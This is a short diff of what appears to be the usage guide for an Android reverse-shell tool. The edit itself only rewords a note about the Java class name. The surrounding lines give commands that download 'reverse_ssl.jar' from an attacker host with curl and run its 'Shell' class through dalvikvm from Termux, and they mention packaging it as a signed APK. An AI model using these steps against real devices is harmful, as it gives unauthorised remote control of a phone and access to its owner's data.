@@ -23,7 +23,7 @@ or you can just use dalvikvm from Termux:
 `curl http://attackingmachine:9999/reverse_ssl.jar -o /sdcard/reverse_ssl.jar`<br/>
 `cd /system/bin/ && ./dalvikvm -cp /sdcard/reverse_ssl.jar Shell`
 
-(pay attention to final "Shell" this must be same class name used before, otherwise it fails!)
+("Shell" this class name must be the same used before, otherwise it fails!)
 
 You can of course create a pure .apk package and sign it using Android Studio or apktool and apksigner.
 
